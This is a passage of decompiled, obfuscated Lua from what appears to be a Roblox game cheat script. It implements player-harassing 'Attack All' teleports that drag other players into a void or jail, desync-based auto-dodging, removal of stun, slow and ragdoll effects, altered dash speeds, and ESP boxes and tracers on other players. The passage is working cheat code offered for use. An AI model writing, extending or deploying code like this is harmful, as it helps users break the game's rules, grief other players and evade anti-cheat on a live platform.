                                    for _, v848 in pairs(l_Players_0:GetPlayers()) do
                                        if v848 ~= v12 then
                                            local v849 = getChar(v848);
                                            if v849 then
                                                v849:SetAttribute("CrushedRockVariant", nil);
                                            end;
                                        end;
                                    end;
                                end;
                            end;
                            if Toggles.AttackAll.Value then
                                if l_AnimationId_0:match("14719290328") and rawget(Options.AttackAllMoves.Value, "Savage Tornado") then
                                    local l_CFrame_13 = v745.CFrame;
                                    heartbeatTp(v72.Void);
                                    task.wait(0.9);
                                    local v851 = tick();
                                    repeat
                                        grabRandom(true);
                                        task.wait(0.03);
                                    until tick() >= v851 + 1.75;
                                    l_TweenService_0:Create(v745, TweenInfo.new(0.35, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                        CFrame = v72["Even Bigger Jail"]
                                    }):Play();
                                    task.wait(1.5);
                                    heartbeatTp(l_CFrame_13);
                                elseif l_AnimationId_0:match("14701242661") and rawget(Options.AttackAllMoves.Value, "Brutal Beatdown") then
                                    heartbeatTp(v72.Void);
                                    task.wait(2);
                                    local v852 = tick();
                                    repeat
                                        grabRandom(true);
                                        task.wait(0.05);
                                    until tick() >= v852 + 4.5;
                                    local v853 = tick();
                                    repeat
                                        grabRandom(true);
                                        task.wait(0.03);
                                    until tick() >= v853 + 1.3;
                                elseif l_AnimationId_0:match("135104210400610") and rawget(Options.AttackAllMoves.Value, "Crushed Rock Variant") then
                                    local v854 = getAllPlayers();
                                    local v855 = nil;
                                    for _, v857 in pairs(v854) do
                                        local v858 = getChar(v857);
                                        local v859 = v858 and v858:FindFirstChildWhichIsA("ForceField");
                                        if v858 and not v859 and not v858:GetAttribute("CrushedRockVariant") then
                                            v855 = v857;
                                        end;
                                    end;
                                    local v860;
                                    if v855 then
                                        v860 = getChar(v855);
                                    else
                                        v860 = v855;
                                    end;
                                    local v861;
                                    if v860 then
                                        v861 = getRoot(v860);
                                    else
                                        v861 = v860;
                                    end;
                                    if v855 and v860 and v861 then
                                        repeat
                                            heartbeatTp(v861.CFrame);
                                            task.wait();
                                        until not v795.IsPlaying;
                                    end;
                                end;
                            end;
                            if Toggles.SkillThrow.Value then
                                local l_Value_13 = Options.SkillThrowMoves.Value;
                                if l_AnimationId_0:match("12309835105") and rawget(l_Value_13, "Hunters Grasp") then
                                    task.wait(0.3);
                                    local l_CFrame_14 = v745.CFrame;
                                    l_TweenService_0:Create(v745, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                        CFrame = v745.CFrame * CFrame.new(0, 2500, 0)
                                    }):Play();
                                    task.wait(0.8);
                                    heartbeatTp(l_CFrame_14);
                                elseif l_AnimationId_0:match("14004235777") and rawget(l_Value_13, "Homerun") then
                                    task.wait(0.4);
                                    local l_CFrame_15 = v745.CFrame;
                                    l_TweenService_0:Create(v745, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                        CFrame = v745.CFrame * CFrame.new(0, 10000, 0)
                                    }):Play();
                                    task.wait(1);
                                    heartbeatTp(l_CFrame_15);
                                end;
                            end;
                        end);
                        local v865 = {};
                        v67[#v67 + 1] = v744.DescendantAdded:Connect(function(v866) --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: l_RenderStepped_0 (ref), v744 (ref), v865 (ref), l_Stepped_0 (ref), v746 (ref), v745 (ref), v94 (ref)
                            if table.find({
                                "BODYGYRO", 
                                "BodyGyroBind"
                            }, v866.Name) and Options.RunAnimation.Value == "Sonic EXE" then
                                deleteNew(v866, false);
                            end;
                            if v866:IsA("Sound") and v866.SoundId:match("16139753098") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Crushing Pull") then
                                local v867 = tick();
                                repeat
                                    communicate({
                                        Goal = "KeyPress", 
                                        Key = Enum.KeyCode.F
                                    });
                                    l_RenderStepped_0:Wait();
                                until tick() >= v867 + 0.5;
                                communicate({
                                    Goal = "KeyRelease", 
                                    Key = Enum.KeyCode.F
                                });
                            end;
                            if v866:IsA("ObjectValue") and v866.Name:lower() == "wallcombo" then
                                local v868 = tick();
                                repeat
                                    if Options.AutoWallCombo.Value == "Auto Wall Combo" then
                                        communicate({
                                            Goal = "Wall Combo"
                                        });
                                    end;
                                    task.wait();
                                until v866.Parent ~= v744 or tick() >= v868 + (v866:GetAttribute("DeleteMe") or 0.6);
                            end;
                            if v866:IsA("BodyPosition") then
                                if v866.Name == "AIRBP" and v866.D == 800 and v866.P == 10000 and v866.MaxForce == Vector3.new(1, 1, 1) * 40000 and Toggles.NoBP_WindstormFury.Value then
                                    task.spawn(pcall, deleteNew, v866, false);
                                elseif v866.Name == "AIRBP" and v866.D == 800 and v866.P == 10000 and v866.MaxForce == Vector3.new(1, 1, 1) * 40000 and v866:GetAttribute("SpinCenter") ~= nil and Toggles.NoBP_TatsumakiUlt.Value then
                                    task.spawn(pcall, deleteNew, v866, false);
                                elseif v866.Name == "AIRBP" and v866.D == 850 and v866.P == 10000 and v866.MaxForce == Vector3.new(1, 1, 1) * 40000 and Toggles.NoBP_PreysPeril.Value then
                                    task.spawn(pcall, deleteNew, v866, false);
                                end;
                            end;
                            if v866:IsA("BodyVelocity") then
                                if v866.Name == "moveme" and (v866:GetAttribute("Speed") or 0) == 165 then
                                    if Toggles.CustomFrontDash.Value then
                                        v866:SetAttribute("Speed", Options.FDDistance.Value);
                                    end;
                                    for _, v870 in pairs(v865) do
                                        v870:Destroy();
                                    end;
                                    table.clear(v865);
                                elseif v866.Name == "dodgevelocity" and not v866:GetAttribute("Clone") then
                                    l_Stepped_0:Wait();
                                    for _, v872 in pairs(v746:GetPlayingAnimationTracks()) do
                                        if v872.Animation.AnimationId:match("10491993682") and v872.TimePosition <= 0.1 then
                                            if Toggles.CustomBackDash.Value then
                                                local v873 = v866:Clone();
                                                v873:SetAttribute("Clone", true);
                                                table.insert(v865, v873);
                                                v866.Parent = workspace;
                                                while v866 and v866.Parent do
                                                    v873.Parent = v745;
                                                    v873.Velocity = v866.Velocity * Options.BDDistance.Value;
                                                    l_RenderStepped_0:Wait();
                                                end;
                                                if v873 and v873.Parent then
                                                    v873:Destroy();
                                                    table.remove(v865, table.find(v865, v873));
                                                end;
                                            end;
                                            return;
                                        end;
                                    end;
                                    if Toggles.CustomSideDash.Value then
                                        local v874 = v866:Clone();
                                        v874:SetAttribute("Clone", true);
                                        table.insert(v865, v874);
                                        v866.Parent = workspace;
                                        while v866 and v866.Parent do
                                            v874.Parent = v745;
                                            v874.Velocity = v866.Velocity * Options.SDDistance.Value;
                                            l_RenderStepped_0:Wait();
                                        end;
                                        if v874 and v874.Parent then
                                            v874:Destroy();
                                            table.remove(v865, table.find(v865, v874));
                                        end;
                                    end;
                                end;
                            end;
                            if v866:IsA("Accessory") then
                                if table.find({
                                    "Slowed", 
                                    "StopRunning", 
                                    "ComboStun"
                                }, v866.Name) and rawget(Options.CharacterExploits.Value, "No Slow") and true or false then
                                    if v866.Name == "Slowed" then
                                        local v875 = v746:GetPropertyChangedSignal("WalkSpeed"):Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                            -- upvalues: v746 (ref), v744 (ref)
                                            v746.WalkSpeed = v744:GetAttribute("Ulted") and (v744:GetAttribute("Running") and 32 or 16) or v744:GetAttribute("Running") and 25 or 16;
                                        end);
                                        v746.WalkSpeed = v744:GetAttribute("Ulted") and (v744:GetAttribute("Running") and 32 or 16) or v744:GetAttribute("Running") and 25 or 16;
                                        repeat
                                            l_RenderStepped_0:Wait();
                                        until v866.Parent ~= v744;
                                        v875:Disconnect();
                                    elseif v866.Name == "StopRunning" or v866.Name == "ComboStun" then
                                        deleteNew(v866);
                                    end;
                                elseif (v866.Name == "Freeze" or v866.Name == "AntiMove") and rawget(Options.CharacterExploits.Value, "No Stun") and true or false then
                                    local v876 = v746:GetPropertyChangedSignal("WalkSpeed"):Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                        -- upvalues: v746 (ref), v744 (ref)
                                        v746.WalkSpeed = v744:GetAttribute("Ulted") and (v744:GetAttribute("Running") and 32 or 16) or v744:GetAttribute("Running") and 25 or 16;
                                    end);
                                    v746.WalkSpeed = v744:GetAttribute("Ulted") and (v744:GetAttribute("Running") and 32 or 16) or v744:GetAttribute("Running") and 25 or 16;
                                    repeat
                                        l_RenderStepped_0:Wait();
                                    until v866.Parent ~= v744;
                                    v876:Disconnect();
                                elseif v866.Name == "NoJump" and rawget(Options.CharacterExploits.Value, "No Jump Bypass") and true or false then
                                    task.spawn(pcall, deleteNew, v866, false);
                                elseif (v866.Name == "NoRotate" or v866.Name == "NoRotateUltimate") and rawget(Options.CharacterExploits.Value, "No Rotations Bypass") then
                                    task.spawn(pcall, deleteNew, v866, false);
                                elseif v866.Name == "Ragdoll" then
                                    if rawget(Options.CharacterExploits.Value, "Anti Ragdoll") then
                                        v866:Remove();
                                    end;
                                    if Toggles.AutoRagdollCancel.Value then
                                        communicate({
                                            Dash = Enum.KeyCode.S, 
                                            Key = Enum.KeyCode.Q, 
                                            Goal = "KeyPress"
                                        });
                                    end;
                                    task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                        -- upvalues: v746 (ref), v744 (ref), v866 (ref)
                                        if Toggles.RagdollHide.Value and v746.Health > 0 and not v744:FindFirstChild("ExtraHitbox") then
                                            local _ = tick();
                                            repeat
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                };
                                                task.wait();
                                            until not v866 or not v866.Parent or v746.Health <= 0;
                                            getgenv().desync = nil;
                                        end;
                                    end);
                                elseif v866.Name == "RagdollSim" then
                                    if rawget(Options.CharacterExploits.Value, "Anti Ragdoll") then
                                        task.spawn(pcall, deleteNew, v866, false);
                                    end;
                                elseif v866.Name == "BeingLaunched" then
                                    if Toggles.LaunchHide.Value and v746.Health > 0 and not v744:FindFirstChild("ExtraHitbox") then
                                        local v878 = tick();
                                        repeat
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            };
                                            task.wait();
                                        until tick() >= v878 + 3 or v744:FindFirstChild("LaunchEnded") or v746.Health <= 0;
                                        getgenv().desync = nil;
                                    end;
                                elseif v866.Name == "ThrowTrashcan" then
                                    v94["Trashcan Launch"] = true;
                                    task.wait(0.25);
                                    v94["Trashcan Launch"] = false;
                                end;
                            end;
                        end);
                    end;
                end;
            end;
            initOthers = function(v879) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v69 (ref), v70 (ref), v93 (ref), l_RenderStepped_0 (ref), l_v12_Mouse_0 (ref), l_ReplicatedStorage_0 (ref), l_TweenService_0 (ref), v12 (ref), l_Workspace_0 (ref), l_l_UserInputService_0_0 (ref)
                if not v69[v879] then
                    v69[v879] = {};
                end;
                if v70.Players[v879] then
                    for _, v881 in pairs(v70.Players[v879]) do
                        v881:Remove();
                    end;
                    table.remove(v70.Players, table.find(v70.Players, v879));
                end;
                v70.Players[v879] = {};
                for _, v883 in pairs(v69[v879]) do
                    v883:Disconnect();
                end;
                table.clear(v69[v879]);
                repeat
                    task.wait();
                until getChar(v879) and getRoot(getChar(v879)) and getHumanoid(getChar(v879)) or not v69[v879];
                local v884 = getChar(v879);
                local v885 = v884 and getRoot(v884);
                local v886 = v884 and getHumanoid(v884);
                if v884 and v885 and v886 and v69[v879] then
                    task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                        -- upvalues: v884 (ref), v885 (ref), v879 (ref), v69 (ref), v886 (ref), v93 (ref), l_RenderStepped_0 (ref)
                        for _, v888 in pairs(v884:GetDescendants()) do
                            do
                                local l_v888_0 = v888;
                                if l_v888_0:IsA("BasePart") and l_v888_0 ~= v885 and l_v888_0.Transparency ~= 1 and not l_v888_0.Name:lower():find("hitbox") then
                                    task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                        -- upvalues: v879 (ref), v884 (ref), v69 (ref), l_v888_0 (ref), v886 (ref), v93 (ref), l_RenderStepped_0 (ref)
                                        while task.wait() and (not getChar(v879) or getChar(v879) == v884) and v69[v879] do
                                            if l_v888_0 and Toggles.AntiExploits_Invisibility.Value then
                                                for _, v891 in pairs(v886:GetPlayingAnimationTracks()) do
                                                    for _, v893 in pairs(v93) do
                                                        if v891.Animation.AnimationId:match(v893) and v891.Speed ~= 1 then
                                                            repeat
                                                                l_v888_0.Transparency = 0.5;
                                                                l_RenderStepped_0:Wait();
                                                            until not v891.IsPlaying or not Toggles.AntiExploits_Invisibility.Value;
                                                            l_v888_0.Transparency = 0;
                                                        end;
                                                    end;
                                                end;
                                            end;
                                        end;
                                    end);
                                end;
                            end;
                        end;
                    end);
                    local v894 = Draw("Quad", {
                        Transparency = 1, 
                        Filled = false, 
                        Visible = false
                    });
                    local v895 = Draw("Line", {
                        Visible = false
                    });
                    table.insert(v70.Players[v879], v894);
                    table.insert(v70.Players[v879], v895);
                    do
                        local l_v894_0, l_v895_0 = v894, v895;
                        v69[v879][#v69[v879] + 1] = l_RenderStepped_0:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v885 (ref), l_v894_0 (ref), l_v895_0 (ref), l_v12_Mouse_0 (ref)
                            if Toggles.AntiExploits_Fling.Value then
                                v885.Velocity = Vector3.new();
                                v885.RotVelocity = Vector3.new();
                                v885.AssemblyLinearVelocity = Vector3.new();
                                v885.AssemblyAngularVelocity = Vector3.new();
                            end;
                            local l_CurrentCamera_5 = workspace.CurrentCamera;
                            if l_CurrentCamera_5 then
                                local v899, v900 = l_CurrentCamera_5:WorldToViewportPoint(v885.Position);
                                local l_CFrame_16 = v885.CFrame;
                                if Toggles.FaceCamera.Value then
                                    l_CFrame_16 = CFrame.new(l_CFrame_16.p, l_CFrame_16.p - l_CurrentCamera_5.CFrame.lookVector);
                                end;
                                local v902 = CFrame.new(0, 0, 0);
                                local v903 = Vector3.new(4, 6, 0);
                                local v904 = {
                                    TopLeft = l_CFrame_16 * v902 * CFrame.new(v903.X / 2, v903.Y / 2, 0), 
                                    TopRight = l_CFrame_16 * v902 * CFrame.new(-v903.X / 2, v903.Y / 2, 0), 
                                    BottomLeft = l_CFrame_16 * v902 * CFrame.new(v903.X / 2, -v903.Y / 2, 0), 
                                    BottomRight = l_CFrame_16 * v902 * CFrame.new(-v903.X / 2, -v903.Y / 2, 0), 
                                    TagPos = l_CFrame_16 * v902 * CFrame.new(0, v903.Y / 2, 0), 
                                    Torso = l_CFrame_16 * v902
                                };
                                if l_v894_0 then
                                    if Toggles.BoxESP.Value and v899 and v900 then
                                        local v905, v906 = l_CurrentCamera_5:WorldToViewportPoint(v904.TopLeft.p);
                                        local v907, v908 = l_CurrentCamera_5:WorldToViewportPoint(v904.TopRight.p);
                                        local v909, v910 = l_CurrentCamera_5:WorldToViewportPoint(v904.BottomLeft.p);
                                        local v911, v912 = l_CurrentCamera_5:WorldToViewportPoint(v904.BottomRight.p);
                                        if v906 or v908 or v910 or v912 then
                                            l_v894_0.PointA = Vector2.new(v907.X, v907.Y);
                                            l_v894_0.PointB = Vector2.new(v905.X, v905.Y);
                                            l_v894_0.PointC = Vector2.new(v909.X, v909.Y);
                                            l_v894_0.PointD = Vector2.new(v911.X, v911.Y);
                                            l_v894_0.Color = Options.BoxColor.Value;
                                            l_v894_0.Thickness = Options.BoxThickness.Value;
                                            l_v894_0.Transparency = Options.BoxTransparency.Value;
                                            l_v894_0.Visible = true;
                                        else
                                            l_v894_0.Visible = false;
                                            l_v894_0.Thickness = 0;
                                        end;
                                    else
                                        l_v894_0.Visible = false;
                                        l_v894_0.Thickness = 0;
                                    end;
                                end;
                                if l_v895_0 then
                                    if Toggles.Tracers.Value and v899 and v900 then
                                        if Toggles.UnlockTracers.Value then
                                            l_v895_0.From = Vector2.new(l_v12_Mouse_0.X, l_v12_Mouse_0.Y + 60);
                                        else
                                            l_v895_0.From = Vector2.new(l_CurrentCamera_5.ViewportSize.X / 2, l_CurrentCamera_5.ViewportSize.Y / 1);
                                        end;
                                        l_v895_0.To = Vector2.new(v899.X, v899.Y);
                                        l_v895_0.Color = Options.TracerColor.Value;
                                        l_v895_0.Thickness = Options.TracerThickness.Value;
                                        l_v895_0.Transparency = Options.TracerTransparency.Value;
                                        l_v895_0.Visible = true;
                                    else
                                        l_v895_0.Visible = false;
                                    end;
                                end;
                            else
                                l_v895_0.Visible = false;
                                l_v894_0.Visible = false;
                            end;
                        end);
                        v69[v879][#v69[v879] + 1] = v884.ChildAdded:Connect(function(v913) --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v879 (ref), v885 (ref), l_ReplicatedStorage_0 (ref), l_TweenService_0 (ref)
                            if v913:IsA("Accessory") and v913.Name == "Counter" then
                                MoveNotify(v879, "Death Counter");
                                if Toggles.ShowDeathCounter.Value then
                                    Create("Sound", {
                                        Parent = v885, 
                                        SoundId = "rbxassetid://6476791205", 
                                        Volume = 10
                                    }):Play();
                                    local v914 = {};
                                    do
                                        local l_v914_0 = v914;
                                        for v916 = 1, 10 do
                                            local v917 = Random.new():NextNumber(0.9, 1.1);
                                            local v918 = l_ReplicatedStorage_0.Resources.LegacyReplication.Menacing:Clone();
                                            v918.Enabled = true;
                                            v918.Size = UDim2.new(v917, 0, v917, 0);
                                            local v919 = Random.new():NextNumber(-4, 4);
                                            local v920 = 0;
                                            local v921 = math.random(-4, 4);
                                            v918.StudsOffsetWorldSpace = Vector3.new(v919, v920, v921);
                                            v918.Parent = v885;
                                            table.insert(l_v914_0, v918);
                                            do
                                                local l_v918_0 = v918;
                                                task.delay(v916, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: l_v918_0 (ref), l_v914_0 (ref), l_TweenService_0 (ref)
                                                    if l_v918_0.Parent then
                                                        table.remove(l_v914_0, table.find(l_v914_0, l_v918_0));
                                                        l_TweenService_0:Create(l_v918_0, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                                                            StudsOffsetWorldSpace = l_v918_0.StudsOffsetWorldSpace - Vector3.new(0, 10, 0)
                                                        }):Play();
                                                        l_TweenService_0:Create(l_v918_0.ImageLabel, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                            ImageTransparency = 1
                                                        }):Play();
                                                    end;
                                                end);
                                            end;
                                        end;
                                        local v923 = {
                                            Parent = true
                                        };
                                        local v924 = {};
                                        while wait() do
                                            for _, v926 in pairs(l_v914_0) do
                                                if not v924[v926] then
                                                    v924[v926] = v926.StudsOffsetWorldSpace;
                                                end;
                                                local v927 = v924[v926];
                                                local v928 = Random.new():NextNumber(-0.04, 0.04);
                                                v926.StudsOffsetWorldSpace = v927 + Vector3.new(v928, v928, v928);
                                            end;
                                            if not v923 or not v923.Parent then
                                                for _, v930 in pairs(l_v914_0) do
                                                    local v931 = Random.new():NextNumber(2, 3);
                                                    l_TweenService_0:Create(v930, TweenInfo.new(v931, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                                                        StudsOffsetWorldSpace = v924[v930] - Vector3.new(0, 10, 0)
                                                    }):Play();
                                                    l_TweenService_0:Create(v930.ImageLabel, TweenInfo.new(v931, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                        ImageTransparency = 1
                                                    }):Play();
                                                end;
                                                local l_l_v914_0_0 = l_v914_0;
                                                do
                                                    local l_l_l_v914_0_0_0 = l_l_v914_0_0;
                                                    task.delay(3, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: l_l_l_v914_0_0_0 (ref)
                                                        for _, v935 in pairs(l_l_l_v914_0_0_0) do
                                                            v935:Destroy();
                                                        end;
                                                    end);
                                                end;
                                                break;
                                            end;
                                        end;
                                    end;
                                end;
                            end;
                        end);
                        v69[v879][#v69[v879] + 1] = v886.AnimationPlayed:Connect(function(v936) --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v12 (ref), v884 (ref), l_Workspace_0 (ref), v885 (ref), l_RenderStepped_0 (ref), l_l_UserInputService_0_0 (ref), v879 (ref), v886 (ref)
                            local l_AnimationId_1 = v936.Animation.AnimationId;
                            local v938 = getChar(v12);
                            local v939 = v938 and getRoot(v938);
                            local v940 = v938 and getHumanoid(v938);
                            local l_Value_14 = Toggles.AntiMovesMisc_BackdashCancel.Value;
                            if v938 and v939 and v940 then
                                task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                    -- upvalues: v936 (ref), l_AnimationId_1 (ref), v940 (ref), v884 (ref), l_Workspace_0 (ref), v939 (ref), l_Value_14 (ref), v885 (ref), l_RenderStepped_0 (ref), l_l_UserInputService_0_0 (ref), v938 (ref), v879 (ref), v886 (ref)
                                    local v942 = false;
                                    if v936.WeightTarget == 0 or v936.Speed == 0 then
                                        return;
                                    else
                                        if l_AnimationId_1:match("129945907044125") and isAnimPlaying(v940, "131226430469931") then
                                            v884:SetAttribute("CrushedRockVariant", true);
                                        end;
                                        if l_AnimationId_1:match("10468665991") and rawget(Options.AntiMoves_Saitama.Value, "Anti Normal Punch") then
                                            local v943 = Instance.new("Part", l_Workspace_0);
                                            v943.Anchored = true;
                                            v943.Size = Vector3.new(12.5, 5, 75);
                                            v943.CanCollide = false;
                                            v943.Transparency = 1;
                                            local v944 = Instance.new("Part", l_Workspace_0);
                                            v944.Anchored = true;
                                            v944.Size = Vector3.new(12.5, 5, 75);
                                            v944.CanCollide = false;
                                            v944.Transparency = 1;
                                            local v945 = Instance.new("Part", l_Workspace_0);
                                            v945.Anchored = true;
                                            v945.Size = Vector3.new(12.5, 5, 75);
                                            v945.CanCollide = false;
                                            v945.Transparency = 1;
                                            local v946 = false;
                                            local v947 = false;
                                            local v948 = false;
                                            local v949 = {};
                                            table.insert(v949, v943.Touched:Connect(function(v950) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v946 (ref)
                                                if v950 == v939 then
                                                    v946 = true;
                                                end;
                                            end));
                                            table.insert(v949, v943.TouchEnded:Connect(function(v951) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v946 (ref)
                                                if v951 == v939 then
                                                    v946 = false;
                                                end;
                                            end));
                                            table.insert(v949, v944.Touched:Connect(function(v952) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v947 (ref)
                                                if v952 == v939 then
                                                    v947 = true;
                                                end;
                                            end));
                                            table.insert(v949, v944.TouchEnded:Connect(function(v953) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v947 (ref)
                                                if v953 == v939 then
                                                    v947 = false;
                                                end;
                                            end));
                                            table.insert(v949, v945.Touched:Connect(function(v954) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v948 (ref)
                                                if v954 == v939 then
                                                    v948 = true;
                                                end;
                                            end));
                                            table.insert(v949, v945.TouchEnded:Connect(function(v955) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v948 (ref)
                                                if v955 == v939 then
                                                    v948 = false;
                                                end;
                                            end));
                                            if l_Value_14 then
                                                task.wait(0.35);
                                                v943.CFrame = v885.CFrame * CFrame.new(6, 0, -v943.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(-5), 0);
                                                v944.CFrame = v885.CFrame * CFrame.new(-6, 0, -v944.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(5), 0);
                                                v945.CFrame = v885.CFrame * CFrame.new(0, 0, -v945.Size.Z / 2 + 1.5);
                                                task.wait();
                                                if v946 or v947 or v948 then
                                                    bdcancel();
                                                end;
                                                v943:Destroy();
                                                v944:Destroy();
                                                v945:Destroy();
                                                for _, v957 in pairs(v949) do
                                                    v957:Disconnect();
                                                end;
                                                return;
                                            else
                                                local v958 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] NORMAL PUNCH");
                                                    end;
                                                    v943.CFrame = v885.CFrame * CFrame.new(6, 0, -v943.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(-5), 0);
                                                    v944.CFrame = v885.CFrame * CFrame.new(-6, 0, -v944.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(5), 0);
                                                    v945.CFrame = v885.CFrame * CFrame.new(0, 0, -v945.Size.Z / 2 + 1.5);
                                                    if (v946 or v947 or v948) and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] NORMAL PUNCH");
                                                            end;
                                                            v943.CFrame = v885.CFrame * CFrame.new(6, 0, -v943.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(-5), 0);
                                                            v944.CFrame = v885.CFrame * CFrame.new(-6, 0, -v944.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(5), 0);
                                                            v945.CFrame = v885.CFrame * CFrame.new(0, 0, -v945.Size.Z / 2 + 1.5);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until not v946 and not v947 and not v948 or tick() >= v958 + 0.8 or not v936.IsPlaying or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v958 + 0.8 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                v943:Destroy();
                                                v944:Destroy();
                                                v945:Destroy();
                                                for _, v960 in pairs(v949) do
                                                    v960:Disconnect();
                                                end;
                                                --[[ close >= 0 ]]
                                            end;
                                        elseif l_AnimationId_1:match("10466974800") and rawget(Options.AntiMoves_Saitama.Value, "Anti Consecutive Punches") then
                                            local v961 = Instance.new("Part", l_Workspace_0);
                                            v961.Anchored = true;
                                            v961.Size = Vector3.new(12.5, 5, 12.5);
                                            v961.CanCollide = false;
                                            v961.Transparency = 1;
                                            local v962 = false;
                                            if true then
                                                local l_v962_0 = v962;
                                                local v965 = v961.Touched:Connect(function(v964) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v962_0 (ref)
                                                    if v964 == v939 then
                                                        l_v962_0 = true;
                                                    end;
                                                end);
                                                local v967 = v961.TouchEnded:Connect(function(v966) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v962_0 (ref)
                                                    if v966 == v939 then
                                                        l_v962_0 = false;
                                                    end;
                                                end);
                                                local v968 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] CONSECUTIVE PUNCHES");
                                                    end;
                                                    v961.CFrame = v885.CFrame * CFrame.new(0, 0, -v961.Size.Z / 2);
                                                    if l_v962_0 == true and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] CONSECUTIVE PUNCHES");
                                                            end;
                                                            v961.CFrame = v885.CFrame * CFrame.new(0, 0, -v961.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until l_v962_0 == false or tick() >= v968 + 1.5 or not v936.IsPlaying or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v968 + 1.5 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v961 then
                                                    v961:Destroy();
                                                end;
                                                v965:Disconnect();
                                                v967:Disconnect();
                                            end;
                                        elseif l_AnimationId_1:match("10471336737") and rawget(Options.AntiMoves_Saitama.Value, "Anti Shove") then
                                            local v969 = Instance.new("Part", l_Workspace_0);
                                            v969.Anchored = true;
                                            v969.Size = Vector3.new(7.5, 5, 7.5);
                                            v969.CanCollide = false;
                                            v969.Transparency = 1;
                                            local v970 = false;
                                            local v972 = v969.Touched:Connect(function(v971) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v970 (ref)
                                                if v971 == v939 then
                                                    v970 = true;
                                                end;
                                            end);
                                            local v974 = v969.TouchEnded:Connect(function(v973) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v970 (ref)
                                                if v973 == v939 then
                                                    v970 = false;
                                                end;
                                            end);
                                            v969.CFrame = v885.CFrame * CFrame.new(0, 0, -v969.Size.Z / 2);
                                            if l_Value_14 then
                                                task.wait();
                                                if v970 and not isCountering(v940) then
                                                    bdcancel();
                                                end;
                                                v969:Destroy();
                                                v972:Disconnect();
                                                v974:Disconnect();
                                                return;
                                            else
                                                local v975 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] SHOVE");
                                                    end;
                                                    v969.CFrame = v885.CFrame * CFrame.new(0, 0, -v969.Size.Z / 2);
                                                    if v970 == true and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] SHOVE");
                                                            end;
                                                            v969.CFrame = v885.CFrame * CFrame.new(0, 0, -v969.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until v970 == false or tick() >= v975 + 0.5 or not v936.IsPlaying or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v975 + 0.5 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v969 then
                                                    v969:Destroy();
                                                end;
                                                v972:Disconnect();
                                                v974:Disconnect();
                                                --[[ close >= 0 ]]
                                            end;
                                        elseif l_AnimationId_1:match("12510170988") and rawget(Options.AntiMoves_Saitama.Value, "Anti Uppercut") then
                                            task.wait(0.25);
                                            if v936.IsPlaying then
                                                local v976 = Instance.new("Part", l_Workspace_0);
                                                v976.Anchored = true;
                                                v976.Size = Vector3.new(10, 10, 10);
